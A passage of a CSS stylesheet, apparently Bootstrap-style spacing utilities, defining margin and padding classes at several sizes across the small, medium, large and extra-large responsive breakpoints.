  padding-left: 9rem !important; }

.p-8 {
  padding: 12rem !important; }

.pt-8,
.py-8 {
  padding-top: 12rem !important; }

.pr-8,
.px-8 {
  padding-right: 12rem !important; }

.pb-8,
.py-8 {
  padding-bottom: 12rem !important; }

.pl-8,
.px-8 {
  padding-left: 12rem !important; }

.p-9 {
  padding: 15rem !important; }

.pt-9,
.py-9 {
  padding-top: 15rem !important; }

.pr-9,
.px-9 {
  padding-right: 15rem !important; }

.pb-9,
.py-9 {
  padding-bottom: 15rem !important; }

.pl-9,
.px-9 {
  padding-left: 15rem !important; }

.m-auto {
  margin: auto !important; }

.mt-auto,
.my-auto {
  margin-top: auto !important; }

.mr-auto,
.mx-auto {
  margin-right: auto !important; }

.mb-auto,
.my-auto {
  margin-bottom: auto !important; }

.ml-auto,
.mx-auto {
  margin-left: auto !important; }

@media (min-width: 576px) {
  .m-sm-0 {
    margin: 0 !important; }
  .mt-sm-0,
  .my-sm-0 {
    margin-top: 0 !important; }
  .mr-sm-0,
  .mx-sm-0 {
    margin-right: 0 !important; }
  .mb-sm-0,
  .my-sm-0 {
    margin-bottom: 0 !important; }
  .ml-sm-0,
  .mx-sm-0 {
    margin-left: 0 !important; }
  .m-sm-1 {
    margin: 0.25rem !important; }
  .mt-sm-1,
  .my-sm-1 {
    margin-top: 0.25rem !important; }
  .mr-sm-1,
  .mx-sm-1 {
    margin-right: 0.25rem !important; }
  .mb-sm-1,
  .my-sm-1 {
    margin-bottom: 0.25rem !important; }
  .ml-sm-1,
  .mx-sm-1 {
    margin-left: 0.25rem !important; }
  .m-sm-2 {
    margin: 0.5rem !important; }
  .mt-sm-2,
  .my-sm-2 {
    margin-top: 0.5rem !important; }
  .mr-sm-2,
  .mx-sm-2 {
    margin-right: 0.5rem !important; }
  .mb-sm-2,
  .my-sm-2 {
    margin-bottom: 0.5rem !important; }
  .ml-sm-2,
  .mx-sm-2 {
    margin-left: 0.5rem !important; }
  .m-sm-3 {
    margin: 1rem !important; }
  .mt-sm-3,
  .my-sm-3 {
    margin-top: 1rem !important; }
  .mr-sm-3,
  .mx-sm-3 {
    margin-right: 1rem !important; }
  .mb-sm-3,
  .my-sm-3 {
    margin-bottom: 1rem !important; }
  .ml-sm-3,
  .mx-sm-3 {
    margin-left: 1rem !important; }
  .m-sm-4 {
    margin: 1.5rem !important; }
  .mt-sm-4,
  .my-sm-4 {
    margin-top: 1.5rem !important; }
  .mr-sm-4,
  .mx-sm-4 {
    margin-right: 1.5rem !important; }
  .mb-sm-4,
  .my-sm-4 {
    margin-bottom: 1.5rem !important; }
  .ml-sm-4,
  .mx-sm-4 {
    margin-left: 1.5rem !important; }
  .m-sm-5 {
    margin: 3rem !important; }
  .mt-sm-5,
  .my-sm-5 {
    margin-top: 3rem !important; }
  .mr-sm-5,
  .mx-sm-5 {
    margin-right: 3rem !important; }
  .mb-sm-5,
  .my-sm-5 {
    margin-bottom: 3rem !important; }
  .ml-sm-5,
  .mx-sm-5 {
    margin-left: 3rem !important; }
  .m-sm-6 {
    margin: 6rem !important; }
  .mt-sm-6,
  .my-sm-6 {
    margin-top: 6rem !important; }
  .mr-sm-6,
  .mx-sm-6 {
    margin-right: 6rem !important; }
  .mb-sm-6,
  .my-sm-6 {
    margin-bottom: 6rem !important; }
  .ml-sm-6,
  .mx-sm-6 {
    margin-left: 6rem !important; }
  .m-sm-7 {
    margin: 9rem !important; }
  .mt-sm-7,
  .my-sm-7 {
    margin-top: 9rem !important; }
  .mr-sm-7,
  .mx-sm-7 {
    margin-right: 9rem !important; }
  .mb-sm-7,
  .my-sm-7 {
    margin-bottom: 9rem !important; }
  .ml-sm-7,
  .mx-sm-7 {
    margin-left: 9rem !important; }
  .m-sm-8 {
    margin: 12rem !important; }
  .mt-sm-8,
  .my-sm-8 {
    margin-top: 12rem !important; }
  .mr-sm-8,
  .mx-sm-8 {
    margin-right: 12rem !important; }
  .mb-sm-8,
  .my-sm-8 {
    margin-bottom: 12rem !important; }
  .ml-sm-8,
  .mx-sm-8 {
    margin-left: 12rem !important; }
  .m-sm-9 {
    margin: 15rem !important; }
  .mt-sm-9,
  .my-sm-9 {
    margin-top: 15rem !important; }
  .mr-sm-9,
  .mx-sm-9 {
    margin-right: 15rem !important; }
  .mb-sm-9,
  .my-sm-9 {
    margin-bottom: 15rem !important; }
  .ml-sm-9,
  .mx-sm-9 {
    margin-left: 15rem !important; }
  .p-sm-0 {
    padding: 0 !important; }
  .pt-sm-0,
  .py-sm-0 {
    padding-top: 0 !important; }
  .pr-sm-0,
  .px-sm-0 {
    padding-right: 0 !important; }
  .pb-sm-0,
  .py-sm-0 {
    padding-bottom: 0 !important; }
  .pl-sm-0,
  .px-sm-0 {
    padding-left: 0 !important; }
  .p-sm-1 {
    padding: 0.25rem !important; }
  .pt-sm-1,
  .py-sm-1 {
    padding-top: 0.25rem !important; }
  .pr-sm-1,
  .px-sm-1 {
    padding-right: 0.25rem !important; }
  .pb-sm-1,
  .py-sm-1 {
    padding-bottom: 0.25rem !important; }
  .pl-sm-1,
  .px-sm-1 {
    padding-left: 0.25rem !important; }
  .p-sm-2 {
    padding: 0.5rem !important; }
  .pt-sm-2,
  .py-sm-2 {
    padding-top: 0.5rem !important; }
  .pr-sm-2,
  .px-sm-2 {
    padding-right: 0.5rem !important; }
  .pb-sm-2,
  .py-sm-2 {
    padding-bottom: 0.5rem !important; }
  .pl-sm-2,
  .px-sm-2 {
    padding-left: 0.5rem !important; }
  .p-sm-3 {
    padding: 1rem !important; }
  .pt-sm-3,
  .py-sm-3 {
    padding-top: 1rem !important; }
  .pr-sm-3,
  .px-sm-3 {
    padding-right: 1rem !important; }
  .pb-sm-3,
  .py-sm-3 {
    padding-bottom: 1rem !important; }
  .pl-sm-3,
  .px-sm-3 {
    padding-left: 1rem !important; }
  .p-sm-4 {
    padding: 1.5rem !important; }
  .pt-sm-4,
  .py-sm-4 {
    padding-top: 1.5rem !important; }
  .pr-sm-4,
  .px-sm-4 {
    padding-right: 1.5rem !important; }
  .pb-sm-4,
  .py-sm-4 {
    padding-bottom: 1.5rem !important; }
  .pl-sm-4,
  .px-sm-4 {
    padding-left: 1.5rem !important; }
  .p-sm-5 {
    padding: 3rem !important; }
  .pt-sm-5,
  .py-sm-5 {
    padding-top: 3rem !important; }
  .pr-sm-5,
  .px-sm-5 {
    padding-right: 3rem !important; }
  .pb-sm-5,
  .py-sm-5 {
    padding-bottom: 3rem !important; }
  .pl-sm-5,
  .px-sm-5 {
    padding-left: 3rem !important; }
  .p-sm-6 {
    padding: 6rem !important; }
  .pt-sm-6,
  .py-sm-6 {
    padding-top: 6rem !important; }
  .pr-sm-6,
  .px-sm-6 {
    padding-right: 6rem !important; }
  .pb-sm-6,
  .py-sm-6 {
    padding-bottom: 6rem !important; }
  .pl-sm-6,
  .px-sm-6 {
    padding-left: 6rem !important; }
  .p-sm-7 {
    padding: 9rem !important; }
  .pt-sm-7,
  .py-sm-7 {
    padding-top: 9rem !important; }
  .pr-sm-7,
  .px-sm-7 {
    padding-right: 9rem !important; }
  .pb-sm-7,
  .py-sm-7 {
    padding-bottom: 9rem !important; }
  .pl-sm-7,
  .px-sm-7 {
    padding-left: 9rem !important; }
  .p-sm-8 {
    padding: 12rem !important; }
  .pt-sm-8,
  .py-sm-8 {
    padding-top: 12rem !important; }
  .pr-sm-8,
  .px-sm-8 {
    padding-right: 12rem !important; }
  .pb-sm-8,
  .py-sm-8 {
    padding-bottom: 12rem !important; }
  .pl-sm-8,
  .px-sm-8 {
    padding-left: 12rem !important; }
  .p-sm-9 {
    padding: 15rem !important; }
  .pt-sm-9,
  .py-sm-9 {
    padding-top: 15rem !important; }
  .pr-sm-9,
  .px-sm-9 {
    padding-right: 15rem !important; }
  .pb-sm-9,
  .py-sm-9 {
    padding-bottom: 15rem !important; }
  .pl-sm-9,
  .px-sm-9 {
    padding-left: 15rem !important; }
  .m-sm-auto {
    margin: auto !important; }
  .mt-sm-auto,
  .my-sm-auto {
    margin-top: auto !important; }
  .mr-sm-auto,
  .mx-sm-auto {
    margin-right: auto !important; }
  .mb-sm-auto,
  .my-sm-auto {
    margin-bottom: auto !important; }
  .ml-sm-auto,
  .mx-sm-auto {
    margin-left: auto !important; } }

@media (min-width: 768px) {
  .m-md-0 {
    margin: 0 !important; }
  .mt-md-0,
  .my-md-0 {
    margin-top: 0 !important; }
  .mr-md-0,
  .mx-md-0 {
    margin-right: 0 !important; }
  .mb-md-0,
  .my-md-0 {
    margin-bottom: 0 !important; }
  .ml-md-0,
  .mx-md-0 {
    margin-left: 0 !important; }
  .m-md-1 {
    margin: 0.25rem !important; }
  .mt-md-1,
  .my-md-1 {
    margin-top: 0.25rem !important; }
  .mr-md-1,
  .mx-md-1 {
    margin-right: 0.25rem !important; }
  .mb-md-1,
  .my-md-1 {
    margin-bottom: 0.25rem !important; }
  .ml-md-1,
  .mx-md-1 {
    margin-left: 0.25rem !important; }
  .m-md-2 {
    margin: 0.5rem !important; }
  .mt-md-2,
  .my-md-2 {
    margin-top: 0.5rem !important; }
  .mr-md-2,
  .mx-md-2 {
    margin-right: 0.5rem !important; }
  .mb-md-2,
  .my-md-2 {
    margin-bottom: 0.5rem !important; }
  .ml-md-2,
  .mx-md-2 {
    margin-left: 0.5rem !important; }
  .m-md-3 {
    margin: 1rem !important; }
  .mt-md-3,
  .my-md-3 {
    margin-top: 1rem !important; }
  .mr-md-3,
  .mx-md-3 {
    margin-right: 1rem !important; }
  .mb-md-3,
  .my-md-3 {
    margin-bottom: 1rem !important; }
  .ml-md-3,
  .mx-md-3 {
    margin-left: 1rem !important; }
  .m-md-4 {
    margin: 1.5rem !important; }
  .mt-md-4,
  .my-md-4 {
    margin-top: 1.5rem !important; }
  .mr-md-4,
  .mx-md-4 {
    margin-right: 1.5rem !important; }
  .mb-md-4,
  .my-md-4 {
    margin-bottom: 1.5rem !important; }
  .ml-md-4,
  .mx-md-4 {
    margin-left: 1.5rem !important; }
  .m-md-5 {
    margin: 3rem !important; }
  .mt-md-5,
  .my-md-5 {
    margin-top: 3rem !important; }
  .mr-md-5,
  .mx-md-5 {
    margin-right: 3rem !important; }
  .mb-md-5,
  .my-md-5 {
    margin-bottom: 3rem !important; }
  .ml-md-5,
  .mx-md-5 {
    margin-left: 3rem !important; }
  .m-md-6 {
    margin: 6rem !important; }
  .mt-md-6,
  .my-md-6 {
    margin-top: 6rem !important; }
  .mr-md-6,
  .mx-md-6 {
    margin-right: 6rem !important; }
  .mb-md-6,
  .my-md-6 {
    margin-bottom: 6rem !important; }
  .ml-md-6,
  .mx-md-6 {
    margin-left: 6rem !important; }
  .m-md-7 {
    margin: 9rem !important; }
  .mt-md-7,
  .my-md-7 {
    margin-top: 9rem !important; }
  .mr-md-7,
  .mx-md-7 {
    margin-right: 9rem !important; }
  .mb-md-7,
  .my-md-7 {
    margin-bottom: 9rem !important; }
  .ml-md-7,
  .mx-md-7 {
    margin-left: 9rem !important; }
  .m-md-8 {
    margin: 12rem !important; }
  .mt-md-8,
  .my-md-8 {
    margin-top: 12rem !important; }
  .mr-md-8,
  .mx-md-8 {
    margin-right: 12rem !important; }
  .mb-md-8,
  .my-md-8 {
    margin-bottom: 12rem !important; }
  .ml-md-8,
  .mx-md-8 {
    margin-left: 12rem !important; }
  .m-md-9 {
    margin: 15rem !important; }
  .mt-md-9,
  .my-md-9 {
    margin-top: 15rem !important; }
  .mr-md-9,
  .mx-md-9 {
    margin-right: 15rem !important; }
  .mb-md-9,
  .my-md-9 {
    margin-bottom: 15rem !important; }
  .ml-md-9,
  .mx-md-9 {
    margin-left: 15rem !important; }
  .p-md-0 {
    padding: 0 !important; }
  .pt-md-0,
  .py-md-0 {
    padding-top: 0 !important; }
  .pr-md-0,
  .px-md-0 {
    padding-right: 0 !important; }
  .pb-md-0,
  .py-md-0 {
    padding-bottom: 0 !important; }
  .pl-md-0,
  .px-md-0 {
    padding-left: 0 !important; }
  .p-md-1 {
    padding: 0.25rem !important; }
  .pt-md-1,
  .py-md-1 {
    padding-top: 0.25rem !important; }
  .pr-md-1,
  .px-md-1 {
    padding-right: 0.25rem !important; }
  .pb-md-1,
  .py-md-1 {
    padding-bottom: 0.25rem !important; }
  .pl-md-1,
  .px-md-1 {
    padding-left: 0.25rem !important; }
  .p-md-2 {
    padding: 0.5rem !important; }
  .pt-md-2,
  .py-md-2 {
    padding-top: 0.5rem !important; }
  .pr-md-2,
  .px-md-2 {
    padding-right: 0.5rem !important; }
  .pb-md-2,
  .py-md-2 {
    padding-bottom: 0.5rem !important; }
  .pl-md-2,
  .px-md-2 {
    padding-left: 0.5rem !important; }
  .p-md-3 {
    padding: 1rem !important; }
  .pt-md-3,
  .py-md-3 {
    padding-top: 1rem !important; }
  .pr-md-3,
  .px-md-3 {
    padding-right: 1rem !important; }
  .pb-md-3,
  .py-md-3 {
    padding-bottom: 1rem !important; }
  .pl-md-3,
  .px-md-3 {
    padding-left: 1rem !important; }
  .p-md-4 {
    padding: 1.5rem !important; }
  .pt-md-4,
  .py-md-4 {
    padding-top: 1.5rem !important; }
  .pr-md-4,
  .px-md-4 {
    padding-right: 1.5rem !important; }
  .pb-md-4,
  .py-md-4 {
    padding-bottom: 1.5rem !important; }
  .pl-md-4,
  .px-md-4 {
    padding-left: 1.5rem !important; }
  .p-md-5 {
    padding: 3rem !important; }
  .pt-md-5,
  .py-md-5 {
    padding-top: 3rem !important; }
  .pr-md-5,
  .px-md-5 {
    padding-right: 3rem !important; }
  .pb-md-5,
  .py-md-5 {
    padding-bottom: 3rem !important; }
  .pl-md-5,
  .px-md-5 {
    padding-left: 3rem !important; }
  .p-md-6 {
    padding: 6rem !important; }
  .pt-md-6,
  .py-md-6 {
    padding-top: 6rem !important; }
  .pr-md-6,
  .px-md-6 {
    padding-right: 6rem !important; }
  .pb-md-6,
  .py-md-6 {
    padding-bottom: 6rem !important; }
  .pl-md-6,
  .px-md-6 {
    padding-left: 6rem !important; }
  .p-md-7 {
    padding: 9rem !important; }
  .pt-md-7,
  .py-md-7 {
    padding-top: 9rem !important; }
  .pr-md-7,
  .px-md-7 {
    padding-right: 9rem !important; }
  .pb-md-7,
  .py-md-7 {
    padding-bottom: 9rem !important; }
  .pl-md-7,
  .px-md-7 {
    padding-left: 9rem !important; }
  .p-md-8 {
    padding: 12rem !important; }
  .pt-md-8,
  .py-md-8 {
    padding-top: 12rem !important; }
  .pr-md-8,
  .px-md-8 {
    padding-right: 12rem !important; }
  .pb-md-8,
  .py-md-8 {
    padding-bottom: 12rem !important; }
  .pl-md-8,
  .px-md-8 {
    padding-left: 12rem !important; }
  .p-md-9 {
    padding: 15rem !important; }
  .pt-md-9,
  .py-md-9 {
    padding-top: 15rem !important; }
  .pr-md-9,
  .px-md-9 {
    padding-right: 15rem !important; }
  .pb-md-9,
  .py-md-9 {
    padding-bottom: 15rem !important; }
  .pl-md-9,
  .px-md-9 {
    padding-left: 15rem !important; }
  .m-md-auto {
    margin: auto !important; }
  .mt-md-auto,
  .my-md-auto {
    margin-top: auto !important; }
  .mr-md-auto,
  .mx-md-auto {
    margin-right: auto !important; }
  .mb-md-auto,
  .my-md-auto {
    margin-bottom: auto !important; }
  .ml-md-auto,
  .mx-md-auto {
    margin-left: auto !important; } }

@media (min-width: 992px) {
  .m-lg-0 {
    margin: 0 !important; }
  .mt-lg-0,
  .my-lg-0 {
    margin-top: 0 !important; }
  .mr-lg-0,
  .mx-lg-0 {
    margin-right: 0 !important; }
  .mb-lg-0,
  .my-lg-0 {
    margin-bottom: 0 !important; }
  .ml-lg-0,
  .mx-lg-0 {
    margin-left: 0 !important; }
  .m-lg-1 {
    margin: 0.25rem !important; }
  .mt-lg-1,
  .my-lg-1 {
    margin-top: 0.25rem !important; }
  .mr-lg-1,
  .mx-lg-1 {
    margin-right: 0.25rem !important; }
  .mb-lg-1,
  .my-lg-1 {
    margin-bottom: 0.25rem !important; }
  .ml-lg-1,
  .mx-lg-1 {
    margin-left: 0.25rem !important; }
  .m-lg-2 {
    margin: 0.5rem !important; }
  .mt-lg-2,
  .my-lg-2 {
    margin-top: 0.5rem !important; }
  .mr-lg-2,
  .mx-lg-2 {
    margin-right: 0.5rem !important; }
  .mb-lg-2,
  .my-lg-2 {
    margin-bottom: 0.5rem !important; }
  .ml-lg-2,
  .mx-lg-2 {
    margin-left: 0.5rem !important; }
  .m-lg-3 {
    margin: 1rem !important; }
  .mt-lg-3,
  .my-lg-3 {
    margin-top: 1rem !important; }
  .mr-lg-3,
  .mx-lg-3 {
    margin-right: 1rem !important; }
  .mb-lg-3,
  .my-lg-3 {
    margin-bottom: 1rem !important; }
  .ml-lg-3,
  .mx-lg-3 {
    margin-left: 1rem !important; }
  .m-lg-4 {
    margin: 1.5rem !important; }
  .mt-lg-4,
  .my-lg-4 {
    margin-top: 1.5rem !important; }
  .mr-lg-4,
  .mx-lg-4 {
    margin-right: 1.5rem !important; }
  .mb-lg-4,
  .my-lg-4 {
    margin-bottom: 1.5rem !important; }
  .ml-lg-4,
  .mx-lg-4 {
    margin-left: 1.5rem !important; }
  .m-lg-5 {
    margin: 3rem !important; }
  .mt-lg-5,
  .my-lg-5 {
    margin-top: 3rem !important; }
  .mr-lg-5,
  .mx-lg-5 {
    margin-right: 3rem !important; }
  .mb-lg-5,
  .my-lg-5 {
    margin-bottom: 3rem !important; }
  .ml-lg-5,
  .mx-lg-5 {
    margin-left: 3rem !important; }
  .m-lg-6 {
    margin: 6rem !important; }
  .mt-lg-6,
  .my-lg-6 {
    margin-top: 6rem !important; }
  .mr-lg-6,
  .mx-lg-6 {
    margin-right: 6rem !important; }
  .mb-lg-6,
  .my-lg-6 {
    margin-bottom: 6rem !important; }
  .ml-lg-6,
  .mx-lg-6 {
    margin-left: 6rem !important; }
  .m-lg-7 {
    margin: 9rem !important; }
  .mt-lg-7,
  .my-lg-7 {
    margin-top: 9rem !important; }
  .mr-lg-7,
  .mx-lg-7 {
    margin-right: 9rem !important; }
  .mb-lg-7,
  .my-lg-7 {
    margin-bottom: 9rem !important; }
  .ml-lg-7,
  .mx-lg-7 {
    margin-left: 9rem !important; }
  .m-lg-8 {
    margin: 12rem !important; }
  .mt-lg-8,
  .my-lg-8 {
    margin-top: 12rem !important; }
  .mr-lg-8,
  .mx-lg-8 {
    margin-right: 12rem !important; }
  .mb-lg-8,
  .my-lg-8 {
    margin-bottom: 12rem !important; }
  .ml-lg-8,
  .mx-lg-8 {
    margin-left: 12rem !important; }
  .m-lg-9 {
    margin: 15rem !important; }
  .mt-lg-9,
  .my-lg-9 {
    margin-top: 15rem !important; }
  .mr-lg-9,
  .mx-lg-9 {
    margin-right: 15rem !important; }
  .mb-lg-9,
  .my-lg-9 {
    margin-bottom: 15rem !important; }
  .ml-lg-9,
  .mx-lg-9 {
    margin-left: 15rem !important; }
  .p-lg-0 {
    padding: 0 !important; }
  .pt-lg-0,
  .py-lg-0 {
    padding-top: 0 !important; }
  .pr-lg-0,
  .px-lg-0 {
    padding-right: 0 !important; }
  .pb-lg-0,
  .py-lg-0 {
    padding-bottom: 0 !important; }
  .pl-lg-0,
  .px-lg-0 {
    padding-left: 0 !important; }
  .p-lg-1 {
    padding: 0.25rem !important; }
  .pt-lg-1,
  .py-lg-1 {
    padding-top: 0.25rem !important; }
  .pr-lg-1,
  .px-lg-1 {
    padding-right: 0.25rem !important; }
  .pb-lg-1,
  .py-lg-1 {
    padding-bottom: 0.25rem !important; }
  .pl-lg-1,
  .px-lg-1 {
    padding-left: 0.25rem !important; }
  .p-lg-2 {
    padding: 0.5rem !important; }
  .pt-lg-2,
  .py-lg-2 {
    padding-top: 0.5rem !important; }
  .pr-lg-2,
  .px-lg-2 {
    padding-right: 0.5rem !important; }
  .pb-lg-2,
  .py-lg-2 {
    padding-bottom: 0.5rem !important; }
  .pl-lg-2,
  .px-lg-2 {
    padding-left: 0.5rem !important; }
  .p-lg-3 {
    padding: 1rem !important; }
  .pt-lg-3,
  .py-lg-3 {
    padding-top: 1rem !important; }
  .pr-lg-3,
  .px-lg-3 {
    padding-right: 1rem !important; }
  .pb-lg-3,
  .py-lg-3 {
    padding-bottom: 1rem !important; }
  .pl-lg-3,
  .px-lg-3 {
    padding-left: 1rem !important; }
  .p-lg-4 {
    padding: 1.5rem !important; }
  .pt-lg-4,
  .py-lg-4 {
    padding-top: 1.5rem !important; }
  .pr-lg-4,
  .px-lg-4 {
    padding-right: 1.5rem !important; }
  .pb-lg-4,
  .py-lg-4 {
    padding-bottom: 1.5rem !important; }
  .pl-lg-4,
  .px-lg-4 {
    padding-left: 1.5rem !important; }
  .p-lg-5 {
    padding: 3rem !important; }
  .pt-lg-5,
  .py-lg-5 {
    padding-top: 3rem !important; }
  .pr-lg-5,
  .px-lg-5 {
    padding-right: 3rem !important; }
  .pb-lg-5,
  .py-lg-5 {
    padding-bottom: 3rem !important; }
  .pl-lg-5,
  .px-lg-5 {
    padding-left: 3rem !important; }
  .p-lg-6 {
    padding: 6rem !important; }
  .pt-lg-6,
  .py-lg-6 {
    padding-top: 6rem !important; }
  .pr-lg-6,
  .px-lg-6 {
    padding-right: 6rem !important; }
  .pb-lg-6,
  .py-lg-6 {
    padding-bottom: 6rem !important; }
  .pl-lg-6,
  .px-lg-6 {
    padding-left: 6rem !important; }
  .p-lg-7 {
    padding: 9rem !important; }
  .pt-lg-7,
  .py-lg-7 {
    padding-top: 9rem !important; }
  .pr-lg-7,
  .px-lg-7 {
    padding-right: 9rem !important; }
  .pb-lg-7,
  .py-lg-7 {
    padding-bottom: 9rem !important; }
  .pl-lg-7,
  .px-lg-7 {
    padding-left: 9rem !important; }
  .p-lg-8 {
    padding: 12rem !important; }
  .pt-lg-8,
  .py-lg-8 {
    padding-top: 12rem !important; }
  .pr-lg-8,
  .px-lg-8 {
    padding-right: 12rem !important; }
  .pb-lg-8,
  .py-lg-8 {
    padding-bottom: 12rem !important; }
  .pl-lg-8,
  .px-lg-8 {
    padding-left: 12rem !important; }
  .p-lg-9 {
    padding: 15rem !important; }
  .pt-lg-9,
  .py-lg-9 {
    padding-top: 15rem !important; }
  .pr-lg-9,
  .px-lg-9 {
    padding-right: 15rem !important; }
  .pb-lg-9,
  .py-lg-9 {
    padding-bottom: 15rem !important; }
  .pl-lg-9,
  .px-lg-9 {
    padding-left: 15rem !important; }
  .m-lg-auto {
    margin: auto !important; }
  .mt-lg-auto,
  .my-lg-auto {
    margin-top: auto !important; }
  .mr-lg-auto,
  .mx-lg-auto {
    margin-right: auto !important; }
  .mb-lg-auto,
  .my-lg-auto {
    margin-bottom: auto !important; }
  .ml-lg-auto,
  .mx-lg-auto {
    margin-left: auto !important; } }

@media (min-width: 1200px) {
  .m-xl-0 {
    margin: 0 !important; }
  .mt-xl-0,
  .my-xl-0 {
    margin-top: 0 !important; }
  .mr-xl-0,
  .mx-xl-0 {
    margin-right: 0 !important; }
  .mb-xl-0,
  .my-xl-0 {
    margin-bottom: 0 !important; }
  .ml-xl-0,
  .mx-xl-0 {
    margin-left: 0 !important; }
  .m-xl-1 {
    margin: 0.25rem !important; }
  .mt-xl-1,
  .my-xl-1 {
    margin-top: 0.25rem !important; }
  .mr-xl-1,
  .mx-xl-1 {
    margin-right: 0.25rem !important; }
  .mb-xl-1,
  .my-xl-1 {
    margin-bottom: 0.25rem !important; }
  .ml-xl-1,
  .mx-xl-1 {
    margin-left: 0.25rem !important; }
  .m-xl-2 {
    margin: 0.5rem !important; }
  .mt-xl-2,
  .my-xl-2 {
    margin-top: 0.5rem !important; }
  .mr-xl-2,
  .mx-xl-2 {
    margin-right: 0.5rem !important; }
  .mb-xl-2,
  .my-xl-2 {
    margin-bottom: 0.5rem !important; }
  .ml-xl-2,
  .mx-xl-2 {
    margin-left: 0.5rem !important; }
  .m-xl-3 {
    margin: 1rem !important; }
  .mt-xl-3,
  .my-xl-3 {
    margin-top: 1rem !important; }
  .mr-xl-3,
  .mx-xl-3 {
    margin-right: 1rem !important; }
  .mb-xl-3,
  .my-xl-3 {
    margin-bottom: 1rem !important; }
  .ml-xl-3,
  .mx-xl-3 {
    margin-left: 1rem !important; }
  .m-xl-4 {
    margin: 1.5rem !important; }
  .mt-xl-4,
  .my-xl-4 {
    margin-top: 1.5rem !important; }
  .mr-xl-4,
  .mx-xl-4 {
    margin-right: 1.5rem !important; }
  .mb-xl-4,
  .my-xl-4 {
    margin-bottom: 1.5rem !important; }
  .ml-xl-4,
  .mx-xl-4 {
    margin-left: 1.5rem !important; }
  .m-xl-5 {
    margin: 3rem !important; }
  .mt-xl-5,
  .my-xl-5 {
    margin-top: 3rem !important; }
  .mr-xl-5,
  .mx-xl-5 {
    margin-right: 3rem !important; }
  .mb-xl-5,
  .my-xl-5 {
    margin-bottom: 3rem !important; }
  .ml-xl-5,
  .mx-xl-5 {
    margin-left: 3rem !important; }
  .m-xl-6 {
    margin: 6rem !important; }
  .mt-xl-6,
  .my-xl-6 {
    margin-top: 6rem !important; }
  .mr-xl-6,
  .mx-xl-6 {
    margin-right: 6rem !important; }
  .mb-xl-6,
  .my-xl-6 {
    margin-bottom: 6rem !important; }
  .ml-xl-6,
  .mx-xl-6 {
    margin-left: 6rem !important; }
  .m-xl-7 {
    margin: 9rem !important; }
  .mt-xl-7,
  .my-xl-7 {
    margin-top: 9rem !important; }
  .mr-xl-7,
  .mx-xl-7 {
    margin-right: 9rem !important; }
  .mb-xl-7,
  .my-xl-7 {
    margin-bottom: 9rem !important; }
  .ml-xl-7,
  .mx-xl-7 {
    margin-left: 9rem !important; }
  .m-xl-8 {
    margin: 12rem !important; }
  .mt-xl-8,
  .my-xl-8 {
    margin-top: 12rem !important; }
  .mr-xl-8,
  .mx-xl-8 {
    margin-right: 12rem !important; }
  .mb-xl-8,
  .my-xl-8 {
    margin-bottom: 12rem !important; }
  .ml-xl-8,
  .mx-xl-8 {
    margin-left: 12rem !important; }
  .m-xl-9 {
    margin: 15rem !important; }
  .mt-xl-9,
  .my-xl-9 {
    margin-top: 15rem !important; }
  .mr-xl-9,
  .mx-xl-9 {
    margin-right: 15rem !important; }
  .mb-xl-9,
  .my-xl-9 {
    margin-bottom: 15rem !important; }
  .ml-xl-9,
  .mx-xl-9 {
    margin-left: 15rem !important; }
  .p-xl-0 {
    padding: 0 !important; }
  .pt-xl-0,
  .py-xl-0 {
    padding-top: 0 !important; }
  .pr-xl-0,
  .px-xl-0 {
    padding-right: 0 !important; }
  .pb-xl-0,
  .py-xl-0 {
    padding-bottom: 0 !important; }
  .pl-xl-0,
  .px-xl-0 {
    padding-left: 0 !important; }
  .p-xl-1 {
    padding: 0.25rem !important; }
  .pt-xl-1,
  .py-xl-1 {
    padding-top: 0.25rem !important; }
  .pr-xl-1,
  .px-xl-1 {
    padding-right: 0.25rem !important; }
  .pb-xl-1,
  .py-xl-1 {
    padding-bottom: 0.25rem !important; }
  .pl-xl-1,
  .px-xl-1 {
    padding-left: 0.25rem !important; }
  .p-xl-2 {
    padding: 0.5rem !important; }
  .pt-xl-2,
  .py-xl-2 {
    padding-top: 0.5rem !important; }
  .pr-xl-2,
  .px-xl-2 {
    padding-right: 0.5rem !important; }
  .pb-xl-2,
  .py-xl-2 {
    padding-bottom: 0.5rem !important; }
  .pl-xl-2,
  .px-xl-2 {
    padding-left: 0.5rem !important; }
  .p-xl-3 {
    padding: 1rem !important; }
  .pt-xl-3,
  .py-xl-3 {
    padding-top: 1rem !important; }
  .pr-xl-3,
  .px-xl-3 {
    padding-right: 1rem !important; }
  .pb-xl-3,
  .py-xl-3 {
    padding-bottom: 1rem !important; }
  .pl-xl-3,
  .px-xl-3 {
    padding-left: 1rem !important; }
  .p-xl-4 {
    padding: 1.5rem !important; }
  .pt-xl-4,
  .py-xl-4 {
    padding-top: 1.5rem !important; }
  .pr-xl-4,
  .px-xl-4 {
    padding-right: 1.5rem !important; }
  .pb-xl-4,
  .py-xl-4 {
    padding-bottom: 1.5rem !important; }
  .pl-xl-4,
  .px-xl-4 {
    padding-left: 1.5rem !important; }
  .p-xl-5 {
    padding: 3rem !important; }
  .pt-xl-5,
  .py-xl-5 {
    padding-top: 3rem !important; }
  .pr-xl-5,
  .px-xl-5 {
    padding-right: 3rem !important; }
  .pb-xl-5,
  .py-xl-5 {
    padding-bottom: 3rem !important; }
  .pl-xl-5,
  .px-xl-5 {
    padding-left: 3rem !important; }
  .p-xl-6 {
    padding: 6rem !important; }
  .pt-xl-6,
  .py-xl-6 {
    padding-top: 6rem !important; }
  .pr-xl-6,
  .px-xl-6 {
    padding-right: 6rem !important; }
  .pb-xl-6,
  .py-xl-6 {
    padding-bottom: 6rem !important; }
  .pl-xl-6,
  .px-xl-6 {
    padding-left: 6rem !important; }
  .p-xl-7 {
    padding: 9rem !important; }
  .pt-xl-7,
  .py-xl-7 {
    padding-top: 9rem !important; }
  .pr-xl-7,
  .px-xl-7 {
    padding-right: 9rem !important; }
  .pb-xl-7,
  .py-xl-7 {
    padding-bottom: 9rem !important; }
  .pl-xl-7,
  .px-xl-7 {
    padding-left: 9rem !important; }
  .p-xl-8 {
    padding: 12rem !important; }
  .pt-xl-8,
  .py-xl-8 {
    padding-top: 12rem !important; }
  .pr-xl-8,
  .px-xl-8 {
    padding-right: 12rem !important; }
  .pb-xl-8,
  .py-xl-8 {
    padding-bottom: 12rem !important; }
  .pl-xl-8,
  .px-xl-8 {
    padding-left: 12rem !important; }
  .p-xl-9 {
    padding: 15rem !important; }
  .pt-xl-9,
  .py-xl-9 {
    padding-top: 15rem !important; }
  .pr-xl-9,
  .px-xl-9 {
    padding-right: 15rem !important; }
  .pb-xl-9,
  .py-xl-9 {
    padding-bottom: 15rem !important; }
  .pl-xl-9,
  .px-xl-9 {
